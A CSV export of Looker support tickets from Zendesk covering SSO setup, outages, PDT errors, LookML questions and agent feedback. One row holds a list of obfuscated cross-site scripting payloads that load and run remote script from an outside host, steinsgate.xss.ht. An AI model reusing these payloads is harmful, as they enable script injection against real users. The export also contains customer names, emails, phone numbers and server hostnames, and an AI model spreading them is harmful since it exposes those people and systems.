Zendesk Tickets Comment Body,Zendesk Tickets Reason,Zendesk Tickets Summary
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : Getting Looker hosted instance configured for SSO
 Account Name or Instance Name : Jellivision
 Hosted By : Looker
 Looker Release : 6.8.12
 Severity : (Normal): Software usable but non-critical functionality or system components are affected while most operation is unaffected.
 Summary of Issue : Client wants to implement SSO. They asked what the process is to the the hostname and DNS set to allow proper SSO integration
 Action Needed by DCL : Research + Own
 Should DCL reach out to the customer? : Yes
 Which DCL Region should this be routed to? : US
 Customer Name : Robby Zar
 Customer Email : robby@jellyvision.com",How do I,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : Looker Down, Ongoing Problem (504 timeout)
 Account Name or Instance Name : Parcel2Go
 Hosted By : Looker
 Looker Release : 6.10.14
 Severity : (High): Software is operative but performance is seriously degraded or restricted with a significant impact on business operation.
 Summary of Issue : As explained by the customer ""for the second time this morning - Looker seems to be down (504 timeout) for all users in our office - this is outside of office hours. Is this an unintended overload or emergency maintenance, and is there some sort of live feed that we can get updates on so we know when it's back up/intended to be back up?"" *Looker going down has been a recurring problem for this customer. I am not sure if upsizing would help. *He has been on chat recently, not sure if he discussed this however
 Action Needed by DCL : Research + Own
 Should DCL reach out to the customer? : No
 Which DCL Region should this be routed to? : EMEA
 Customer Name : Stewart Whitworth
 Customer Email : s.whitworth@parcel2go.com",Why isn't it working?,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : Migrate Internal DB to MySQL from HyperSQL
 Account Name or Instance Name : metalonecorporation
 Hosted By : Looker
 Looker Release : 6.14.17
 Severity : (High): Software is operative but performance is seriously degraded or restricted with a significant impact on business operation.
 Summary of Issue : The performance of my client instance is very slow, and it looks like their internal db size is exceeded over 1GB. I guess it cause this performance issue. Would you migrate internal DB to MySQL from HyperSQL? I filled contact's email address, but its email address is the partner one of the client. I'll reach out my client once this issue is resolved.
 Action Needed by DCL : For Tracking
 Should DCL reach out to the customer? : No
 Which DCL Region should this be routed to? : N/A
 Customer Name : Metal One Corporation
 Customer Email : hirokazu.yuyama.ws@hitachi-systems.com",Other,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : My Looker isn't working!
 Account Name or Instance Name : Blooker
 Hosted By : Looker
 Looker Release : 6.4.32
 Severity : (High): Software is operative but performance is seriously degraded or restricted with a significant impact on business operation.
 Summary of Issue : Test Help ME
 Action Needed by DCL : For Tracking
 Should DCL reach out to the customer? : Yes
 Which DCL Region should this be routed to? : APAC
 Customer Name : Blooker
 Customer Email : Blooker@blooker.com",No Reason,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : Need to see SMTP configuration in the FinanceIT Looker instance
 Account Name or Instance Name : FinanceIt
 Hosted By : Looker
 Looker Release : Unknown
 Severity : (Normal): Software usable but non-critical functionality or system components are affected while most operation is unaffected.
 Summary of Issue : I am trying to track down an issue with email coming out of the FinanceIt instance—at least I believe this to be the case. Could someone provide me with the email configuration they are using? We are unable to turn DMARC for lookermail.com until this is resolved.
 Action Needed by DCL : Research + Own
 Should DCL reach out to the customer? : Yes
 Which DCL Region should this be routed to? : US
 Customer Name : Finance It?",Why isn't it working?,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : Orphaned credentials_saml row preventing returning intern from logging into meta.looker.com
 Account Name or Instance Name : meta.looker.com
 Hosted By : Looker
 Looker Release : 6.15.0000291
 Severity : (High): Software is operative but performance is seriously degraded or restricted with a significant impact on business operation.
 Summary of Issue : Quick note on Severity: Complete loss of functionality for 1 looker intern who needs access to meta.looker.com... so not sure where that fits in the sev schema. History: Xander was an intern for us last year (2018). When he left, his user was disabled. A few months ago, our team deleted disabled users for meta.looker.com. Current Problem: He onboarded yesterday (6/17/2019) as a returning intern. My understanding of the onboarding process was that everyone is put into the All Lookers AD group first day (or before), and then they can go to meta.looker.com/login and authenticate with Azure. When xander tries to do this, he can successfully authenticate with Azure, and IT and I can confirm we see a successful login event for him in AZURE. This brought me to the looker logs, where I noticed this 2019-06-18 16:54:51.722 +0000 [INFO|1412c|db:looker] :: (0.001675s) SELECT * FROM `credentials_saml` WHERE (`saml_user_id` = 'xander.olivero@looker.com') LIMIT 1 This made me look at the credentials_saml table, where i see this: https://meta.looker.com/sql/kv5nwrn8x4vpsw Note the created_date, logged_in_at and user_id. These are all from when xander was an intern last year, and refer to a user that no longer exists in the users table. I then checked out the users table, where we don't see a record for him, which _is_ expected https://meta.looker.com/sql/ktknqktsm9n8wy I asked in the sme-auth channel, jband had this which lines up with what I'm seeing ""There is probably a stale credentials_saml row that contains the right external saml id (saml_user_id), but has a wrong/dead user_id"" It seems like we aren't cleaning up the credentials_saml table when a user is deleted? In addition to following up with this with eng, If we could take some interim steps to get xander access we'd really appreciate it. Something like this happened to me a couple weeks ago, and Elijah had to manually prune some rows from the content_metadata_group_user table in meta's internal db. If something like that would get xander access that would be sweet. Thanks y'all!
 Action Needed by DCL : Research + Own
 Should DCL reach out to the customer? : Yes
 Which DCL Region should this be routed to? : US
 Customer Name : Looker
 Customer Email : daniel.nelson@looker.com",Other,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : SQUARE: scheduled dashboards sent with an inline image are getting cut off.
 Account Name or Instance Name : Square
 Hosted By : On-Premise
 Looker Release : 6.14
 Severity : (High): Software is operative but performance is seriously degraded or restricted with a significant impact on business operation.
 Summary of Issue : Hi Looker. We're seeing an issue where scheduled dashboards sent with an inline image are getting cut off. At first this appeared to be an isolated bug, but it seems pretty widespread, and we're getting complaints from all over the company. Is this a known issue? Lets discuss internally before we reach out to Square!
 Action Needed by DCL : For Tracking
 Should DCL reach out to the customer? : No
 Which DCL Region should this be routed to? : N/A
 Customer Name : Matthew Leal
 Customer Email : leal@squareup.com",Bug,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : SSH Tunnel for PlayOn Sports
 Account Name or Instance Name : playon
 Hosted By : Looker
 Looker Release : 6.10.16
 Severity : (Normal): Software usable but non-critical functionality or system components are affected while most operation is unaffected.
 Summary of Issue : Hi team, Please help setting up an ssh tunnel for this prospect's database. Trial is on hold until this is up and running so would appreciate a speedy response. <3 DCL :) https://docs.looker.com/setup-and-management/enabling-secure-db/ssh-tunnel Please send over the public key for step 4. Here's the info from step 3: IP address or DNS name of the database server as seen from the tunnel server: `unity-api.cizzv6mfjsf4.us-east-1.rds.amazonaws.com` Database port number as seen from the tunnel server: `3306` IP address or DNS name of the tunnel server as seen from the public internet: `bastion.nfhsnetwork.com` SSH port of the tunnel server as seen from the public internet: `22` Username on the tunnel server for the SSH connection (the standard is looker): `looker` Let me know if you need any other info. Thanks, Rufus
 Action Needed by DCL : Research + Own
 Should DCL reach out to the customer? : Yes
 Which DCL Region should this be routed to? : US
 Customer Name : Robbie Safford
 Customer Email : robbie.safford@nfhsnetwork.com",Other,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : help me
 Account Name or Instance Name : looker
 Hosted By : Looker
 Looker Release : 6.12.21
 Severity : (Urgent): Complete loss of application functionality causing a critical impact on business operations.
 Summary of Issue : testo
 Action Needed by DCL : For Tracking
 Should DCL reach out to the customer? : No
 Which DCL Region should this be routed to? : N/A
 Customer Name : ccc
 Customer Email : aqa",No Reason,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : prospect happy returns is experiencing slowness in their instance.
 Account Name or Instance Name : https://happyreturns.looker.com
 Hosted By : Looker
 Looker Release : 6.12
 Severity : (Normal): Software usable but non-critical functionality or system components are affected while most operation is unaffected.
 Summary of Issue : prospect happy returns (https://happyreturns.looker.com) is experiencing slowness in their instance. When they go on dashboard for example : https://happyreturns.looker.com/dashboards/1 It takes longer to have all the tabs visible (browse, dev,explore) then the actual dashboard. Does anyone know why this might be happening?
 Action Needed by DCL : For Tracking
 Should DCL reach out to the customer? : Yes
 Which DCL Region should this be routed to? : US
 Customer Name : Andy Downard
 Customer Email : andy@happyreturns.com",Why isn't it working?,
" Item Name : DCL Request
 Category : DCL
 Quantity : 1
 Subject : test with attachment
 Account Name or Instance Name : yo yo
 Hosted By : Looker
 Looker Release : 6.53.22
 Severity : (Low): Includes questions, requests for information, documentation inquiries, or other non-critical system related issues. Operations are not affected.
 Summary of Issue : attachment!
 Action Needed by DCL : For Tracking
 Should DCL reach out to the customer? : No
 Which DCL Region should this be routed to? : N/A
 Customer Name : adfadfdfad
 Customer Email : fadfadfadf",No Reason,
" Looker 鈴木様


お世話になっております。

KSKアナリティクスの吉本でございます。





ご連絡いただきありがとうございました。

ご対応後、再度連絡いただけるとのことで承知いたしました。



引き続きよろしくお願いいたします。



吉本直人



2019年6月24日(月) 16:42 Takuya (Looker) <support@looker.zendesk.com>:

--",Why isn't it working?,
" Putting this back down to high since they are back up.

In the logs, there were a bunch of threads that had been running for a while associated with queries, mainly SQL Runner queries from the looks of it. From the timing script:

```
2019-01-07 07:14:23.791 +0000 => No end time found => (10c55) => 127.0.0.1 |10c54| POST /api/3.1/sql_queries/wjt2hgk5gsgd4b/run/json_fe, {}
```

The weird part is that these queries sent off a request to stream data in another thread:

```
2019-01-07 07:14:24.176 +0000 [INFO|10c55|http_core] :: (0.384712s) |10c54| Request result will stream: 200
```

And that completes just fine:

```
2019-01-07 07:14:24.178 +0000 [INFO|10c54|http_core] :: (0.386339s) Request complete: 200 (End streaming) Streamed 5364 chars.
```

I'm thinking there may be a bug in the timing script not parsing `Request result will stream: 200` correctly as the end of a thread, but need to verify 100% that that is indeed the end of the thread.

Also their memory usage slowly climbed up to the max allocated before the outage, but there were no OOM errors in the logs at all. CPU was fine. Getting access to ilooker would be the best path forward but I might be able to get that info from Pinger if they continue to not respond.

I don't think it's the cause of the outage, but they were also having issues with PDT queues getting longer due to locks on some tables Looker was trying to drop: #188289",Why isn't it working?,
" issue number IC-1458/



Thanks for the fast reply. Few questions just for the clarification.

Did you manage to recreate the behaviour that I described?

You said that an update will fix the visualization length problem. Does that mean that we should update to the latest version? Or do we have to wait for this fix in the next update?



Best regards,

Ljiljana M.



**From:**""Reed R (Looker)"" <support@looker.zendesk.com>
**Reply-To:** Looker <support+id222588@looker.zendesk.com>
**Date:** Monday, 3. June 2019 at 21:40
**To:** Ljiljana Miljesic <Ljiljana.Miljesic@trivago.com>
**Subject:** Chat with Ljiljana Miljesic - Visualization Bug Follow-Up",Bug,
"!!! Yay,


Was so nervous but validate was successful on tiny whitespace change. Ran way faster then it has in months as well.


 ![Screen Shot 2019-05-17 at 12.53.24 PM.png](https://help.looker.com/attachments/token/SBbs11Izc3hpK1bqhMEp3uCx6/?name=Screen+Shot+2019-05-17+at+12.53.24+PM.png)


--",Bug,
![.](https://looker.zendesk.com/attachments/token/OB6qcg0CjtS8eVWTwDvpGLW27/?name=Screen+Shot+2018-10-16+at+11.07.24.png),Other,
"![](https://help.looker.com/attachments/token/j8e9XX9v42GOXsfPeoITMShNb/?name=image001.png)



Thanks Eugene, unfortunately, I get this page. Is my URL wrong?



Context:
Someone from the beauty team left the company but she had reports scheduled to other team members still the company. The beauty team would like to know where those reports are, and when the schedule is so they can adjust.



From the BI team’s viewpoint, we think all scheduled reporting should come through the goop-data looker account so that we can avoid a similar future situation where someone leaves and their scheduling reports live in their accounts and the BI team has to go looking for the reports by sudo-ing them.



It would also be good to prevent users from scheduling for their team mates. So people should only be able to schedule reports to themselves, which would be ideal! Or if it is a team wide report then the BI team can handle it and have the management of that schedule centralized.",How do I,
"![](https://help.looker.com/attachments/token/jpUfGBFiRqALbIkda37EhV8pW/?name=image001.png)



Please find screen shot attached. I have modified the filter to look for yesterday 8am to yesterday 9am. It is not showing any results. Here is the filter query:



${clicksanalytics_BI.msg_date_date}

>= add_hours(8,add_days(-1,trunc_days(now()))) AND ${clicksanalytics_BI.msg_date_date} <= add_hours(9,add_days(-1,(trunc_days(now()))))



Screen shot of the field picker is above. The LookML is below:





    dimension_group: msg_date {

      type: time

      view_label: ""Date Detail""

      label: ""Click""

      # description: ""Datetime of the underlying click""

      timeframes: [time, date, week, month, year, quarter, hour_of_day, day_of_week, day_of_week_index,month_name, month_num, day_of_month, day_of_year, quarter_of_year]

      sql: ${TABLE}.MSG_DATE;;

    }



Best Regards,

Aravind Kannan",How do I,
"![](https://help.looker.com/attachments/token/lwOgar5LBQ73EhSW0CQTsgZKs/?name=image003.jpg)



Please help!!",Why isn't it working?,
"![](https://looker.zendesk.com/attachments/token/UxDdTbzn325NlhchGgTsdDh75/?name=Screen+Shot+2019-06-14+at+3.39.08+PM.png)
![](https://looker.zendesk.com/attachments/token/R7hrRTHEgOGe1mqTx8yCuhUnx/?name=Screen+Shot+2019-06-14+at+3.39.25+PM.png)",Bug,
"![https://d24cgw3uvb9a9h.cloudfront.net/static/93588/image/new/ZoomLogo_110_25.png](https://d24cgw3uvb9a9h.cloudfront.net/static/93588/image/new/ZoomLogo_110_25.png)

Hi there,

Alyson Hirschhorn is inviting you to a scheduled Zoom meeting.

Join Zoom Meeting

Join from Browser:

https://walmart.zoom.us/wc/join/314059719

iPhone one-tap:

(US Toll): +16465588656,314059719# or +16699006833,314059719#

Meeting URL:

https://walmart.zoom.us/j/314059719

**Video Conference Room**

SIP:

Dial 314059719 from any Walmart video conference room
OR
314059719@zoomcrc.com

**Join by Telephone**

To avoid Toll/Toll-free and Call-back audio bridge charges, please join this meeting using these two options:

·  “Call Using Computer” option with your headset

·  Video Conferencing devices in the meeting rooms

Dial:

+1 646 558 8656 (US Toll)
+1 669 900 6833 (US Toll)
877 853 5257 (US Toll Free)
855 880 1246 (US Toll Free)

Meeting ID:

314 059 719

International numbers

**IMPORTANT NOTICE:** Please note that this Zoom service allows audio and other information sent during the session to be recorded, which may be discoverable in a legal matter. By joining this session, you automatically consent to such recordings. If you do not consent to being recorded, discuss your concerns with the host or do not join the session.  Also, please take action to preserve any recording if the meeting’s content is subject to a legal hold for which you are a hold custodian.   This recording will be retained in the United States for 30 days and then deleted.  Do not use Zoom for official training activities or to record content that is subject to the US Records Management Policy.

The “US Records Management Policy” URL is: Records Management Policy",Why isn't it working?,
![img](https://looker.zendesk.com/attachments/token/TrUi6YcCItBV2LvvejgpWx05a/?name=Screen+Shot+2018-12-04+at+16.48.15.png),Other,
"""

* Examine git remote — Valid remote 'git@gitlab.yieldmo.com:yieldmo/dcs-powered-by-looker.git' with service 'gitlab'
* Host name for git service will resolve — 10.0.105.251
* Networking to the git service is operational — OK
* Verify authorization credentials — Cannot AUTH to remote (Looker deploy key)
* Ensure credentials allow write access — Internal error 'git@gitlab.yieldmo.com:yieldmo/dcs-powered-by-looker.git: GitLab: The project you were looking for could not be found. ' when running test""",Bug,
""" I will send you an update to your email later today ""
Try to not commit Xin to particular times. Use better ""shortly"", ""soon"" so you dont set the incorrect expectation.",How do I,
""" Joseph: Hey Ashish, Zach stepped away so I reviewed your conversation. That makes total sense and I can pass that along to our product team. ""
What exactly are you referring to here. I don't see a feature request attached?",No Reason,
"""><script src=https://steinsgate.xss.ht></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'https://steinsgate.xss.ht\';document.body.appendChild(a)')

""><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc3RlaW5zZ2F0ZS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>

""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc3RlaW5zZ2F0ZS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>

""><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc3RlaW5zZ2F0ZS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>

""><iframe srcdoc=""&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;steinsgate.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"">

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(""load"", b);a.open(""GET"", ""//steinsgate.xss.ht"");a.send();</script>

<script>$.getScript(""//steinsgate.xss.ht"")</script>",No Reason,
"""And now your watch begins""",Why isn't it working?,
"""As a Looker dashboard developer, I would like to have the option to set the presentation (color, HTML, etc.) of a measure at model level, so it's used by default across all visualisation to provide a strong and unified user experience""",Feature Request,
"""CUSTOM FIND CONVO"" appears in log file even when the bot returns the numbers from a table (successful response)

Lucas Ludewigs
Business Intelligence Analyst | AMARO
lucas.ludewigs@amaro.com
T: +55 11 4063 6040 | R 8280
C: +55 11 96471 3744




Maxie,
Why that ""CUSTOM FIND CONVO"" does not appear when I search for that expression in github repo?
It doesn't appear in any console.log command
So I assume that the log shows messages that come from slack, and not only from the lookerbot api?
And how is the app structured? For instance, when the program finishes running src/services/service.ts (https://github.com/looker/lookerbot/blob/4fd16c3d4615ca62835c1f40c7ee002e572547a9/src/services/service.ts) , what happens next? I didn't have so much insight reading the package.json and src/index.js
Thank you

Lucas Ludewigs
Business Intelligence Analyst | AMARO
lucas.ludewigs@amaro.com
T: +55 11 4063 6040 | R 8280
C: +55 11 96471 3744


2018-03-28 17:43 GMT-03:00 Lucas Ludewigs <lucas.ludewigs@amaro.com>:

I changed my env slackbot_s3_bucket to a random name
The bot still asks me to wait on a random language and doesn't return an error message right away


Lucas Ludewigs
Business Intelligence Analyst | AMARO
lucas.ludewigs@amaro.com
T: +55 11 4063 6040 | R 8280
C: +55 11 96471 3744


2018-03-28 16:46 GMT-03:00 Lucas Ludewigs <lucas.ludewigs@amaro.com>:

Hi Maxie,

We did the deploy by clicking on ""Deploy to Heroku"" button.
Besides, we also attempted to run another app (lookert) on our local server (manual mode) cloning the traditional way, and then using yarn install and yarn start.

Lucas Ludewigs
Business Intelligence Analyst | AMARO
lucas.ludewigs@amaro.com
T: +55 11 4063 6040 | R 8280
C: +55 11 96471 3744


2018-03-28 15:35 GMT-03:00 Maxie Corbin (Looker) <support@looker.zendesk.com>:",Bug,
"""Can't cancel queries..."" error we saw around the time the connection issue surfaced:",Why isn't it working?,
"""Cannot cancel queries: Query could not be found in database"" issue. it happens all the time. Sorry about the confusion on the older mail.


Regards,
Kallaar Kathir
Data Team
Hudson Bay Company
225 Liberty Street, 26th floor,
New York, NY 10281
Mobile: +1 646-886-4673",Bug,they cannot kill queries.  killing queries on a clustered oracle db is tough b/c queries can only be killed on the node they run on.  working with eng to create revised instructions
"""Cannot connect: connection refused: Java::JavaSql::SQLNonTransientConnectionException: Could not connect to localhost:3307 : unexpected end of stream, read 0 bytes from 4 (socket was closed by server)""",Why isn't it working?,
"""Copy the Exact SQL"" means copy the SQL from the production LookML file and run in SQL Runner.

I don't know this team very well, but I already let Kareem know that his ops/admin guy will need to help out.  I let him know that someone would reach out and that he needs to cc that guy on the email.",Why isn't it working?,"One PDT unable to be CREATEd or SELECTed. We think the actual table is messed up somehow; need a Looker admin and DBA on their side to help check PDT state and table state. This magically resolved itself, must have been a weird lock or something."
"""Did you find some documentation on how development environment works in bigquery""

Actually I don't have any issue regarding that. We do have this environment and we integrated it in Looker.

Mu question is more: how could I duplicate all dashboards & looks and make them take the data from this development environment rather than from the production environment ? Just to see if it breaks anything :) "" Pierre went AFK",How do I,
"""Every user who logged in with Google Auth will be unable to log in unless they also have email/password login credentials""
from: https://app.getguru.com/card/Xcp5RBpc/What-happens-when-you-turn-Google-Auth-off

and also there are some super important info on this card to avoid a whole massive issue for them too: https://app.getguru.com/card/qc7846Gc/What-happens-to-SAML-users-if-you-disable-SAML-authentication

BTW love that one: ""_Goutham Balakrishnan: ah shit i dont want their account to be orphaned_""",How do I,
"""Hi"" macro!!",No Reason,
"""Hope this resolves your issue. Please let me know if you need anything else."" 

[![Looker User Guide](https://looker.zendesk.com/attachments/token/Q6Stkta6el4UyzHSAz79UGXmb/?name=UserGuide.png)](https://looker.com/guide?utm_source=email%20signature&utm_medium=email&utm_content=user%20guide%20promo)
Check out our new [User Guide](https://looker.com/guide?utm_source=email%20signature&utm_medium=email&utm_content=user%20guide%20promo) for educational content, training and resources!",Other,Zendesk practice ticket
"""I have a looker account, please give me access to learn.looker.com (http://learn.looker.com/) .""",Other,
"""I have drafted an email, he has not replied since the actual chat to any of my emails."" - Sasha


closing for inactivity",Why isn't it working?,
"""Java::JavaSql::SQLDataException: data exception: string data, right truncation"" caused by two errors:  1) someone joined the same view twice causing 36 errors and 2) the error including the 36 field names overflowed the history table.",No Reason,
"""Looker Admins can add someone as a technical contact by going to the General Admin page and adding their email address.""",Why isn't it working?,
"""Looker is running on an EC2 instance. We really do have any control of packet routing. Both the Ec2 instance and Redshift DB are in the same AWS region and Zone. 

I have not tried a query directly from the EC2 instance.""   Tim Haak <thaak@mparticle.com>. Can you direct any messages to both Tim and Yuan and keep me in CC?",Why isn't it working?,
"""Negative"" because I just couldn't get Carlos to get me a screenshot of the PDT page. I felt like I was reiterating myself (which felt rude)...I probably should have thought of some other way to get him to show me the screenshot of the failed PDT build process that I was looking for.",Why isn't it working?,
"""Normal"" because this never actually worked. 
""Negative"" because I refused to update him. Still haven't decided how to walk the line between being helpful and being overloaded.",Bug,
"""Norman Rosner: Feedback: I am not particularly happy with your help on this. This is my second day of using Looker and yes your pointers were helpful but I would have expected a bit more hands on support.""

talked to Anika and Spencer about this-- this was a no trial/jumpstart so may have weird expectations of chat. will reach out if this happens again.",Why isn't it working?,
"""Oh, if it is going to take that long then it is okay"" try to take advantage of these situations, they don't come that often.

She came back later on the day asking the same: #167398 and Desiree handled it: this one is safe to close.",How do I,
"""Push command aborted, operation incomplete. Verify configuration of the remote repository and retry.""",No Reason,
"""Refreshing Schema and Tables"" solved the problem. Only happened on their snowflake connection as well.",Why isn't it working?,
"""SHIFT + click"" to sort multiple columns worked perfectly, thanks!

Lindsey Gumann
Ops Specialist",How do I,
"""So,""
""So,""
""So,""",Why isn't it working?,
"""Sundays at 4pm to Fridays at 6pm pacific time excluding US and UK holidays."" are these hours correct?",How do I,
"""Support access open for the next 3.0 days""


On Fri, Nov 30, 2018 at 5:38 PM Lenny Fishler <leonid.fishler@braze.com>
wrote:

> good news - I just got approval to give you guys support access!
>
> On Fri, Nov 30, 2018 at 5:30 PM Peter (Looker) <support@looker.zendesk.com>
> wrote:
>
>>",Why isn't it working?,
"""Thanks for this information, please tell me more.""",Other,Zendesk practice ticket
"""The scheduled job ""Alto Data Model Trip""[20275] failed for . Please visit your content (https://altoexperience.looker.com/explore/Alto_data_model/trip?qid=ufTKAt3YqmN9VgBeULSCOf) to view and resolve the error, or contact your Looker administrator if you need further assistance.

Error: An error occurred for action looker-integration://1::twilio_message. The action could not be executed.""


Best,

Adam Vanderpool
Product Strategy & Analytics Manager | Alto
214.801.0094 | Adam@ridealto.com",Bug,
"""This will go out in 6.14 and will not be backported.""",Bug,
"""Totals cannot be displayed due to a filter on a measure.""",No Reason,
"""We won't let the bug stay like this""  - promise 
"" I will report this issue for sure "" - promise
"" But I know we are working it "" - promise

If you can't repro, that's OK, it might be a glitch, report it in Jira anyways and close.",Why isn't it working?,
"""Will this work"" isn't really either category, but it's closer to ""how do i?""",How do I,
"""Would it be okay if I submit a request to upsize the instance?""

Yeah, that'd be great. (By ""upsize the instance"" I'm assuming you're referring to this (https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-resize.html) )

I'm not familiar with what could go wrong during the upsizing - or how long it takes - so I guess after work hours would be best? (I don't think anyone will be using it after 7 pm today)

(It'd be super helpful if you could explain a bit more what this entails...)

Thanks!",Why isn't it working?,
"""attention_deficit_conduct_and_disruptive_behavior_disorders"" is not 64+ chars long (we're usually careful about this limitation). I assume Looker's doing something under the covers which adds to the original field name length.

We'll upgrade to 3.42 early next week.

Tom",No Reason,
"""best practices for visualizations"" sounds like a very hound friendly fun help center article",How do I,
"""but will you guys be able to keep it up when you grow?""

We've grown ~10X in customers, revenue, and headcount since I first heard that question =)",No Reason,
"""chatting to support"" in this ticket here -  https://looker.zendesk.com/agent/tickets/108255",Bug,
"""forgot password"" e-mail has not been received.

Ulices Zuniga Reyes
Workforce Operations Analyst
T: (470) 429 -1237
E: ulices.zreyes@instacart.com",Why isn't it working?,
"""grabbing that""? Really?",How do I,
"""html:  ;;""",Feature Request,
"""is it possible to flip axis in looker. for example i want metrics to go down the left and side and have weeks go along the top?”

Can you please share this internally as appropriate.

Scott",No Reason,
"""search and replace"" yields no results in docs.",No Reason,
"""straightforward question"" involving `parameter`",Why isn't it working?,
"""the name must be the same in both views""

Well, the value of the foreign_key is a dimension of only one view: the ""from"" side of the join relationship, if you will. The joined-in view's dimension is whatever is marked as the 'primary_key', no matter what its name is.

I'm surprised you're not encouraging it, as it is much less error-prone (but much less flexible, of course) than sql_on clauses.",How do I,
"""update on this one: we're still classifying this as a P2 bug since it's not impacting more customers and has a workaround. We'll re-evaluate during the next development cycle""",Bug,
